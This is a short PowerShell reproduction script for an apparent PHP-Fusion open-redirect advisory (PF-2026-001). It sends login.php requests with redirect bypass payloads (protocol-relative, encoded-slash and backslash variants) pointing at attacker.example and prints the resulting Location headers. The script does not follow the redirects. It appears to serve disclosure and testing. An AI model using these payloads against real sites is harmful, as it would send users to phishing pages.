# PF-2026-001 Open Redirect - reproduction (PowerShell). Does NOT follow the redirect.
param([string]$Base = "http://localhost/php-fusion")
function Show($label, $url) {
  "== $label =="
  & curl.exe -s -o NUL -D - $url | Select-String -Pattern "^HTTP|^Location:"
  ""
}
Show "PoC 1: %2F%2F protocol-relative" "$Base/login.php?error=1&redirect=%2F%2Fattacker.example%2Fphish"
Show "PoC 2: /%2F variant"             "$Base/login.php?error=1&redirect=/%2Fattacker.example"
Show "PoC 3: /\ backslash variant"     "$Base/login.php?error=1&redirect=/%5Cattacker.example"
Show "CONTROL: absolute https rejected" "$Base/login.php?error=1&redirect=https://attacker.example"
